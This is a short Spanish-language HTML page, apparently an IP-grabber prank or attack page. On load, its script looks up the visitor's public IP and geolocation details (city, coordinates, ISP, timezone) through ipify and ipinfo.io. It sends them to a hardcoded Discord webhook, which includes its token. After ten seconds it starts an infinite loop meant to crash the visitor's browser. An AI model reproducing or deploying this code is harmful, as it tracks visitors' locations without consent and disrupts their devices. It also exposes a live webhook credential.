<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura de Datos y Crash</title>
    <script>
        // Función para capturar la IP y enviar datos al webhook de Discord
        async function captureAndSendData() {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;

            // Obtener información detallada de la IP usando ipinfo.io
            const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
            const ipInfoData = await ipInfoResponse.json();

            const data = {
                content: `Nueva entrada:\nIP: ${userIP}\nCiudad: ${ipInfoData.city}\nRegión: ${ipInfoData.region}\nPaís: ${ipInfoData.country}\nOrganización: ${ipInfoData.org}\nProveedor de Internet: ${ipInfoData.asn}\nCoordenadas: ${ipInfoData.loc}\nTiempo de Zona: ${ipInfoData.timezone}`,
            };

            fetch('https://discord.com/api/webhooks/1411003921953984512/eWRarF44aGvN0ZatZ4S4IxA9IH8JGb_KA7nLuZlaFj2G3FdFUrZLHW28egfPg6cC4092', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
        }

        // Función para causar un "crash" en el dispositivo
        function causeCrash() {
            while (true) {
                // Bucle infinito que causará un "crash" en la mayoría de los dispositivos
            }
        }

        // Capturar datos al cargar la página
        window.onload = function() {
            captureAndSendData();
            // Esperar 10 segundos antes de causar el "crash"
            setTimeout(causeCrash, 10000);
        }
    </script>
</head>
<body>
    <h1>Captura de Datos y Crash</h1>
    <p>Esta página capturará sus datos y causará un "crash" en 10 segundos.</p>
</body>
</html>
